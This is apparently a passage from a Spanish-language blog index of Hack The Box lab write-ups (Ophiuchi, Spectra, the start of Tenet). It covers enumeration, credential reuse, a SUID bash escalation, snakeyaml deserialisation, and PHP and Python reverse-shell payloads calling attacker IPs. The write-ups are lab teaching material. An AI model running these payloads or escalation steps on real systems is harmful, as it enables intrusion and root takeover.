09:56 .. drwxr-xr-x 2 root root 4.0K Oct 14 19:52 backup -rw-r--r-- 1 root root 88 Oct 14 19:49 deploy.sh -rwxr-xr-x 1 root root 2.5M Oct 14 19:52 index -rw-rw-r-- 1 root root 522 Oct 14 19:48 index.go -rwxrwxr-x 1 root root 1.5M Oct 14 19:41 main.wasm admin@ophiuchi:~$ cat deploy.sh #!/bin/bash # ToDo # Create script to automatic deploy our new web at tomcat port 8080 admin@ophiuchi:~$ Si bien existen estos dos archivos (main.wasm, deploy.sh), en el codigo fuente no especifica la direccion completa de ambos, por lo que podriamos ejecutar index.go en cualquier carpeta y utilizar nuestro archivo main.wasm para provocar la ejecucion del script deploy.sh.\nWASM.MAIN Creamos un archivo wasm el cual contiene la funcion info y el resultado cuando es ejecutado es: 1, basandonos de un ejemplo de wasmer en rust, utilizando la plataforma webassembly en un proyecto vacio de RUST.\nDentro de main.js modificamos la funcion, para verificar el resultado.\nModificamos el archivo main.rs donde agregamos la funcion, compilamos y ejecutamos.\nVemos en la parte inferior derecha que el resultado es 1 cuando la funcion es llamada en main.js, además se creó el archivo main.wasm el cual descargamos.\nADMIN - WASM \u0026gt; ROOT Descargamos el archivo main.wasm en la maquina, creamos el script deploy.sh con un pequeña ejecucion de comando en la carpeta /dev/shm. Vemos que nuestro script es ejecutado como root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 admin@ophiuchi:/dev/shm$ touch deploy.sh admin@ophiuchi:/dev/shm$ vim deploy.sh admin@ophiuchi:/dev/shm$ cat deploy.sh echo \u0026#34;Hello I\u0026#39;m $(whoami)\u0026#34; \u0026gt; /dev/shm/whoami.txt admin@ophiuchi:/dev/shm$ ls deploy.sh main.wasm admin@ophiuchi:/dev/shm$ sudo /usr/bin/go run /opt/wasm-functions/index.go Ready to deploy admin@ophiuchi:/dev/shm$ ls deploy.sh main.wasm whoami.txt admin@ophiuchi:/dev/shm$ cat whoami.txt Hello I\u0026#39;m root admin@ophiuchi:/dev/shm$ Modificamos el script para darle permisos SUID a /bin/bash para obtener una shell como root y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 admin@ophiuchi:/dev/shm$ ls -lah /bin/bash -rwxr-xr-x 1 root root 1.2M Feb 25 2020 /bin/bash admin@ophiuchi:/dev/shm$ vim deploy.sh admin@ophiuchi:/dev/shm$ cat deploy.sh #echo \u0026#34;Hello I\u0026#39;m $(whoami)\u0026#34; \u0026gt; /dev/shm/whoami.txt chmod u+s /bin/bash admin@ophiuchi:/dev/shm$ sudo /usr/bin/go run /opt/wasm-functions/index.go Ready to deploy admin@ophiuchi:/dev/shm$ ls -lah /bin/bash -rwsr-xr-x 1 root root 1.2M Feb 25 2020 /bin/bash admin@ophiuchi:/dev/shm$ bash -p bash-5.0# bash-5.0# cd /root/ bash-5.0# ls go root.txt snap bash-5.0# cat root.txt | cut -c1-15 f86528dc1a751a5 bash-5.0# YAML TOMCAT Verificamos el codigo fuente de la aplicacion web desplegada en tomcat y vemos que la informacion enviada a /Servlet es cargada con la libreria snakeyaml, donde vemos tambien el codigo vulnerable.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import java.io.IOException; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import org.yaml.snakeyaml.Yaml; @WebServlet(name = \u0026#34;Servlet\u0026#34;) public class Servlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String f = request.getParameter(\u0026#34;data\u0026#34;); Yaml yaml = new Yaml(); Object obj = yaml.load(f); //Vulnerable response.getWriter().append(\u0026#34;Due to security reason this feature has been temporarily on hold. We will soon fix the issue!\u0026#34;); } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {} } ","description":"Ophiuchi presenta una vulnerabilidad de deserializacion en java en YAML con la cual se obtuvieron credenciales de tomcat y acceso a la maquina. Mediante el analisis de un archivo en Go se creó un archivo WebAssembly para ejecutar un script en bash el cual proporciona permisos sobre bash para finalmente obtener acceso como root.","id":58,"section":"posts","tags":["yaml","deserialization","java","go","wasm","webassembly","sudo privesc","suid"],"title":"Hack The Box - Ophiuchi","uri":"https://sckull.github.io/posts/ophiuchi/"},{"content":"\rSpectra es una maquina con sistema ChromeOS. Obtuvimos acceso con privilegios limitados mediante las credenciales y enumeracion en Wordpress. Con credenciales de autologin obtuvimos acceso a otro usuario mediante SSH. Finalmente obtuvimos acceso privilegiado mediante una herramienta de control de servicios y modificacion de un archivo de JavaScript.\nNombre Spectra OS Other Puntos 20 Dificultad Facil IP 10.10.10.229 Maker egre55\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.9, 4.4, 4.6, 5.4, 5.6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[3, 5, 5, 5, 5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # Nmap 7.91 scan initiated Sat Feb 27 23:33:01 2021 as: nmap -p- --min-rate 10000 -oN allports 10.129.81.209 Warning: 10.129.81.209 giving up on port because retransmission cap hit (10). Nmap scan report for 10.129.81.209 (10.129.81.209) Host is up (0.088s latency). Not shown: 33267 filtered ports, 32266 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Sat Feb 27 23:34:48 2021 -- 1 IP address (1 host up) scanned in 107.46 seconds # Nmap 7.91 scan initiated Sat Feb 27 23:36:14 2021 as: nmap -p 22,80 -sV -sC -oN serviceports 10.129.81.209 Nmap scan report for spectra.htb (10.129.81.209) Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesn\u0026#39;t have a title (text/html). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Feb 27 23:36:30 2021 -- 1 IP address (1 host up) scanned in 15.36 seconds HTTP Encontramos una pagina web en la que se muestran dos enlaces hacia un dominio (spectra.htb).\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, pero solo encontramos las direcciones de los enlaces en la pagina.\n1 2 3 4 5 ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://spectra.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,xml -t 100 -q /index.html (Status: 200) /main (Status: 301) /testing (Status: 301) WORDPRESS Agregamos el dominio al archivo /etc/hosts con la direccion IP de la maquina, en el primer enlace (/main) se muestra una pagina de wordpress.\nEn el segundo (/testing), un error de conexion. Pero en este ultimo al eliminar index.php nos muestra una lista de archivos los cuales pertenecen a wordpress.\nEn la lista de archivos vemos wp-config.php.save el cual contiene el codigo fuente de lo que parece ser wp-config.php. En este archivo encontramos las credenciales e informacion de la base de datos utilizada por wordpress, pero, no tenemos acceso al servicio de la base de datos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 ┌──(kali㉿kali)-[~/htb/spectra] └─$ curl -s http://spectra.htb/testing/wp-config.php.save| grep -v \u0026#39;*\u0026#39; \u0026lt;?php define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;dev\u0026#39; ); define( \u0026#39;DB_USER\u0026#39;, \u0026#39;devtest\u0026#39; ); define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;devteam01\u0026#39; ); define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8\u0026#39; ); define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); $table_prefix = \u0026#39;wp_\u0026#39;; define( \u0026#39;WP_DEBUG\u0026#39;, false ); if ( ! defined( \u0026#39;ABSPATH\u0026#39; ) ) { define( \u0026#39;ABSPATH\u0026#39;, __DIR__ . \u0026#39;/\u0026#39; ); } require_once ABSPATH . \u0026#39;wp-settings.php\u0026#39;; WPSCAN Intentamos utilizar la contraseña y usuario en la pagina de administracion de wordpress (/main) pero no funcionó. Enumeramos los usuarios utilizando WPSCAN.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 ┌──(kali㉿kali)-[~/htb/spectra] └─$ wpscan --url http://spectra.htb/main/ -e u --no-banner 1 ⨯ [+] URL: http://spectra.htb/main/ [10.129.82.67] [+] Started: Sun Feb 28 18:55:50 2021 Interesting Finding(s): [+] Headers | Interesting Entries: | - Server: nginx/1.17.4 | - X-Powered-By: PHP/5.6.40 | Found By: Headers (Passive Detection) | Confidence: 100% [... REDACTED ...] [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10). | Found By: Rss Generator (Passive Detection) | - http://spectra.htb/main/?feed=rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt; | - http://spectra.htb/main/?feed=comments-rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwenty | Location: http://spectra.htb/main/wp-content/themes/twentytwenty/ | Last Updated: 2020-12-09T00:00:00.000Z | Readme: http://spectra.htb/main/wp-content/themes/twentytwenty/readme.txt | [!] The version is out of date, the latest version is 1.6 | Style URL: http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2 | Style Name: Twenty Twenty | Style URI: https://wordpress.org/themes/twentytwenty/ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) | - http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: \u0026#39;Version: 1.2\u0026#39; [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:01 \u0026lt;===============================================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:01 [i] User(s) Identified: [+] administrator | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [... REDACTED ...] NGINX - USER Encontramos el usuario administrator, utilizamos este usuario con la contraseña que encontramos en el codigo fuente en el panel de administracion de wordpress donde logramos obtener acceso, aunque la pagina no esta muy bien esteticamente ya que no encuentra las hojas de estilo.\nUtilizamos el editor de Temas para agregar una shell inversa de PHP en el archivo 404.php. Para ejecutar nuestra shell inversa, \u0026ldquo;generamos\u0026rdquo; un error al visitar un post que no existe (http://spectra.htb/main/?p=1338), con lo cual logramos obtener una shell con el usuario nginx.\nEn el caso de que wordpress no permita guardar los cambios en el archivo php, es necesario cambiar de tema, y luego de guardar los cambios, regresar al tema que contiene los cambios realizados\n1 2 $sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,4242); $proc=proc_open(\u0026#34;/bin/sh -i\u0026#34;, array(0=\u0026gt;$sock, 1=\u0026gt;$sock, 2=\u0026gt;$sock),$pipes); KATIE - USER Realizamos una enumeracion en la maquina, encontramos la flag user.txt pero no tenemos permisos, por lo que debemos de obtener acceso con el usuario katie dentro de la maquina. Además encontramos que es el sistema operativo es ChromeOS en su version 87.3.41\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 nginx@spectra /home $ find . -name user.txt 2\u0026gt;/dev/null find . -name user.txt 2\u0026gt;/dev/null ./katie/user.txt cd katie cd katie ls -lah ls -lah total 36K drwxr-xr-x 5 katie katie 4.0K Feb 2 15:57 . drwxr-xr-x 8 root root 4.0K Feb 2 15:55 .. lrwxrwxrwx 1 root root 9 Feb 2 15:55 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 katie katie 127 Dec 22 05:46 .bash_logout -rw-r--r-- 1 katie katie 204 Dec 22 05:46 .bash_profile -rw-r--r-- 1 katie katie 551 Dec 22 05:46 .bashrc drwx------ 3 katie katie 4.0K Jan 15 15:55 .pki drwx------ 2 katie katie 4.0K Feb 10 06:10 .ssh drwxr-xr-x 2 katie katie 4.0K Jan 15 15:55 log -r-------- 1 katie katie 33 Feb 2 15:57 user.txt cat user.txt cat user.txt cat: user.txt: Permission denied cat /etc/*-release cat /etc/*-release BUILD_NUMBER=22 CHROMEOVER_BUILD_COMMIT=829e617e7b8467c355f9bd61f87835bfeb0da547 CHROMIUMOS_MANIFEST_COMMIT=38c4f6ca60a47f7fabf0fcd5d6feabf349e3f002 CHROMIUM_BROWSER_COMMIT=ef24d0b3349c2324d18a3f32bc35d14e796aeddc PIPELINE_TAG=prod USE_FLAGS=-cros-debug beerover virtualbox GOOGLE_RELEASE=87.3.41 CHROMEOS_RELEASE_BRANCH_NUMBER=85 CHROMEOS_RELEASE_TRACK=stable-channel CHROMEOS_RELEASE_KEYSET=devkeys CHROMEOS_RELEASE_NAME=Chromium OS CHROMEOS_AUSERVER=https://cloudready-free-update-server-2.neverware.com/update CHROMEOS_RELEASE_BOARD=chromeover64 CHROMEOS_DEVSERVER=https://cloudready-free-update-server-2.neverware.com/ CHROMEOS_RELEASE_BUILD_NUMBER=13505 CHROMEOS_CANARY_APPID={90F229CE-83E2-4FAF-8479-E368A34938B1} CHROMEOS_RELEASE_CHROME_MILESTONE=87 CHROMEOS_RELEASE_PATCH_NUMBER=2021_01_15_2352 CHROMEOS_RELEASE_APPID=87efface-864d-49a5-9bb3-4b050a7c227a CHROMEOS_BOARD_APPID=87efface-864d-49a5-9bb3-4b050a7c227a CHROMEOS_RELEASE_BUILD_TYPE=Developer Build - neverware CHROMEOS_RELEASE_VERSION=87.3.41 CHROMEOS_RELEASE_DESCRIPTION=87.3.41 (Developer Build - neverware) stable-channel chromeover64 nginx@spectra /home/katie $ nginx@spectra /home/katie $ Tambien encontramos dentro del directorio /opt un archivo de configuracion que tal parece realiza la lectura de la contraseña que se encuentra en /etc/autologin/passwd y la pasa al script inject-keys.py.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 cat autologin.conf.orig # Copyright 2016 The Chromium OS Authors. All rights reserved. # Use of this source code is governed by a BSD-style license that can be # found in the LICENSE file. description \u0026#34;Automatic login at boot\u0026#34; author \u0026#34;chromium-os-dev@chromium.org\u0026#34; # After boot-complete starts, the login prompt is visible and is accepting # input. start on started boot-complete script passwd= # Read password from file. The file may optionally end with a newline. for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do if [ -e \u0026#34;${dir}/passwd\u0026#34; ]; then passwd=\u0026#34;$(cat \u0026#34;${dir}/passwd\u0026#34;)\u0026#34; break fi done if [ -z \u0026#34;${passwd}\u0026#34; ]; then exit 0 fi # Inject keys into the login prompt. # # For this to work, you must have already created an account on the device. # Otherwise, no login prompt appears at boot and the injected keys do the # wrong thing. /usr/local/sbin/inject-keys.py -s \u0026#34;${passwd}\u0026#34; -k enter En el archivo /etc/autologin/passwd encontramos una contraseña, la cual utilizamos para obtener una shell con la usuario katie a travez del servicio SSH.\n1 2 3 nginx@spectra /opt $ cat /etc/autologin/passwd SummerHereWeCome!! nginx@spectra /opt $ PRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos sudo (root) para ejecutar el comando /sbin/initctl.\n1 2 3 4 5 6 7 8 9 katie@spectra ~ $ sudo -l -l User katie may run the following commands on spectra: Sudoers entry: RunAsUsers: ALL Options: setenv, !authenticate Commands: /sbin/initctl katie@spectra ~ $ initctl permite interactuar y administrar servicios, y con este comando es posible leer el archivo de configuracion de cada servicio. Intentamos crear un archivo de configuracion para un servicio nuevo pero no tenemos permisos.\n1 2 katie@spectra ~ $ touch /etc/init/config.conf touch: cannot touch \u0026#39;/etc/init/config.conf\u0026#39;: Permission denied Al revisar los archivos de configuracion de los servicios encontramos que algunos pertenecen al grupo developers del cual katie pertenece. Además listamos los servicios pero ninguno de estos está corriendo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 katie@spectra ~ $ ls -lah /etc/init | sort|grep developers -rw-rw---- 1 root developers 478 Jun 29 2020 test.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test1.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test10.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test2.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test3.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test4.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test5.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test6.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test7.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test8.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test9.conf katie@spectra ~ $ id uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers) katie@spectra ~ $ katie@spectra ~ $ /sbin/initctl list|grep test test stop/waiting test1 stop/waiting test7 stop/waiting test6 stop/waiting test5 stop/waiting test4 stop/waiting test10 stop/waiting attestationd start/running, process 1687 trace_marker-test stop/waiting test9 stop/waiting test8 stop/waiting test3 stop/waiting test2 stop/waiting katie@spectra ~ $ Revisamos los archivos de configuracion de cada uno de estos y encontramos que todos contienen lo mismo, y esque cuando este servicio es iniciado ejecuta con nodejs un archivo de javascript, que además tambien pertenece al grupo de developers por lo que es editable.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 katie@spectra ~ $ tail -n +1 /etc/init/test*.conf ==\u0026gt; /etc/init/test.conf \u0026lt;== description \u0026#34;Test node.js server\u0026#34; author \u0026#34;katie\u0026#34; start on filesystem or runlevel [2345] stop on shutdown script export HOME=\u0026#34;/srv\u0026#34; echo $$ \u0026gt; /var/run/nodetest.pid exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js end script pre-start script echo \u0026#34;[`date`] Node Test Starting\u0026#34; \u0026gt;\u0026gt; /var/log/nodetest.log end script pre-stop script rm /var/run/nodetest.pidLocal StateLocal StateLocal StateLocal State echo \u0026#34;[`date`] Node Test Stopping\u0026#34; \u0026gt;\u0026gt; /var/log/nodetest.log end script [... REDACTED ...] katie@spectra ~ $ ls -lah /srv/nodetest.js -rwxrwxr-x 1 root developers 251 Jun 29 2020 /srv/nodetest.js katie@spectra ~ $ El archivo javascript es un \u0026ldquo;mini servidor\u0026rdquo; que corre en el puerto 8081.\n1 2 3 4 5 6 7 8 9 var http = require(\u0026#34;http\u0026#34;); http.createServer(function (request, response) { response.writeHead(200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39;}); response.end(\u0026#39;Hello World\\n\u0026#39;); }).listen(8081); console.log(\u0026#39;Server running at http://127.0.0.1:8081/\u0026#39;); El \u0026ldquo;mini servidor\u0026rdquo; puede ser ejecutado por el usuario root mediante initctl, por lo que podriamos editar el archivo nodetest.js para ejecutar comandos como usuario root. Agregamos nuestro codigo para ejecutar una shell inversa de python al archivo nodetest.js.\n1 2 const { exec} = require(\u0026#39;child_process\u0026#39;); const child = exec(\u0026#39;python2.7 /home/katie/shell.py\u0026#39;); 1 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.14.14\u0026#34;,1448));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]); 1 sudo initctl start test \u0026amp;\u0026amp; sleep 10 \u0026amp;\u0026amp; curl -s http://127.0.0.1:8081/ Intentamos ejecutar el servicio test, pero el archivo nodetest.js era modificado seguramente por algun cron o script, por lo que intentamos varias veces y logramos obtener una shell con usuario root y nuestra flag root.txt.\n","description":"Spectra es una maquina con sistema ChromeOS. Obtuvimos acceso con privilegios limitados mediante las credenciales y enumeracion en Wordpress. Con credenciales de autologin obtuvimos acceso a otro usuario mediante SSH. Finalmente obtuvimos acceso privilegiado mediante una herramienta de control de servicios y modificacion de un archivo de JavaScript.","id":59,"section":"posts","tags":["wpscan","wordpress","initctl","sudo privesc","nodejs"],"title":"Hack The Box - Spectra","uri":"https://sckull.github.io/posts/spectra/"},{"content":"\rTenet es presentada con dificultad media, la enumeracion en wordpress nos llevo al codigo fuente de una pagina la cual fue vulnerada mediante un objeto serializado. Se utilizaron las credenciales en archivos de configuracion para realizar movimiento lateral. Un pequeño script para la escritura de nuestra clave privada en un archivo temporal proporciono una shell root.\nNombre Tenet OS Linux Puntos 30 Dificultad Media IP 10.10.10.223 Maker egotisticalSW\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.9, 4.7, 4.2, 5.8, 5.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[7, 4, 2, 8, 6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # Nmap 7.91 scan initiated Tue Mar 30 23:41:39 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.10.223 Warning: 10.10.10.223 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.223 (10.10.10.223) Host is up (0.13s latency). Not shown: 36387 closed ports, 29146 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Tue Mar 30 23:43:09 2021 -- 1 IP address (1 host up) scanned in 89.70 seconds # Nmap 7.91 scan initiated Tue Mar 30 23:43:28 2021 as: nmap -p 22,80 -sV -sC -oN serviceports 10.10.10.223 Nmap scan report for 10.10.10.223 (10.10.10.223) Host is up (0.067s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA) | 256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA) |_ 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Mar 30 23:43:38 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds HTTP Encontramos la pagina de apache en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 /index.html (Status: 200) /users.txt (Status: 200) /wordpress (Status: 301) El archivo users.txt solo muestra un pequeño mensaje.\n1 Success WORDPRESS La pagina de wordpress tiene configurado un dominio tenet.htb.\n1 2 3 4 5 6 7 8 HTTP/1.1 404 Not Found Date: Wed, 31 Mar 2021 03:52:10 GMT Server: Apache/2.4.29 (Ubuntu) Expires: Wed, 11 Jan 1984 05:00:00 GMT Cache-Control: no-cache, must-revalidate, max-age=0 Link: \u0026lt;http://tenet.htb/index.php/wp-json/\u0026gt;; rel=\u0026#34;https://api.w.org/\u0026#34; Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8 WPSCAN Utilizamos wpscan para enumerar plugins vulnerables y usuarios registrados. Encontramos dos nombres de usuario: protagonist y neil.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 [+] URL: http://tenet.htb/ [10.10.10.223] [+] Started: Tue Mar 30 23:51:33 2021 Interesting Finding(s): [... REDACTED ...] [+] Upload directory has listing enabled: http://tenet.htb/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] WordPress version 5.6 identified (Outdated, released on 2020-12-08). | Found By: Rss Generator (Passive Detection) | - http://tenet.htb/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.6\u0026lt;/generator\u0026gt; | - http://tenet.htb/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.6\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwentyone | Location: http://tenet.htb/wp-content/themes/twentytwentyone/ [... REDACTED ...] | Version: 1.0 (80% confidence) | Found By: Style (Passive Detection) | - http://tenet.htb/wp-content/themes/twentytwentyone/style.css?ver=1.0, Match: \u0026#39;Version: 1.0\u0026#39; [+] Enumerating Vulnerable Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:01 \u0026lt;========== ... ======\u0026gt; (10 / 10) 100.00% Time: 00:00:01 [i] User(s) Identified: [+] protagonist | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://tenet.htb/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] neil | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [... REDACTED ...] Asi mismo enumeramos los diferentes posts, donde logramos obtener informacion en los comentarios de neil, menciona el archivo sator.php y 